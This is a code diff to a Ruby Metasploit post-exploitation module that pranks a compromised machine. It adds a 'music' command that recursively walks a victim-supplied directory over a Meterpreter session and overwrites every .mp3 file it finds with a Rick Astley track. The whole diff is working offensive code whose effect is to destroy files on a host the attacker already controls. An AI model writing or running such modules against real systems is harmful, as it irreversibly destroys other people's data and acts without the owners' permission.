@@ -22,6 +22,7 @@ class Metasploit3 < Msf::Post
 		register_options(
                         [
                                 OptString.new(   'COMMAND',  [false, 'COMMAND String to execute specific Rick functionality']),
+                                OptString.new(   'PATH',  [false, 'PATH String to specify directory for an action']),
                         ], self.class)
 	end
 
@@ -36,6 +37,8 @@ class Metasploit3 < Msf::Post
 			install_screensaver	
 		elsif datastore["COMMAND"].eql? "background"
 			change_background
+		elsif datastore["COMMAND"].eql? "music" and not datastore["PATH"].nil? 
+			change_music
 		else
 			# do this by default for now
 			#make_rick_astley_cursor
@@ -185,4 +188,38 @@ class Metasploit3 < Msf::Post
 		r.channel.close
 		r.close
 	end
+	
+	def change_music
+		print_status "Changing mp3's in " + datastore['PATH']
+		music_path = datastore['PATH']	
+		path = ::File.join(Msf::Config.install_root, "data", "post")
+		rick_mp3_filename = "rick.mp3"
+		rick_mp3 = ::File.join(path, rick_mp3_filename)
+		scan(music_path, rick_mp3)	
+	end
+
+	def scan(path, rick_mp3)
+		begin
+			dirs = client.fs.dir.foreach(path)
+		rescue ::Rex::Post::Meterpreter::RequestError => e
+			print_error("Error scanning #{path}: #{$!}")
+			return
+		end
+
+		dirs.each {|x|
+			next if x =~ /^(\.|\.\.)$/
+			fullpath = path + '\\' + x
+
+			if client.fs.file.stat(fullpath).directory?
+				scan(fullpath, rick_mp3)
+			elsif fullpath =~ /\.mp3/i
+				# Replace ':' or '%' or '\' by '_'
+				print_line("uploading rick mp3 to -> '#{fullpath}'")
+				client.fs.file.upload_file(fullpath, rick_mp3)
+			end
+		}
+	end
+
+
+
 end
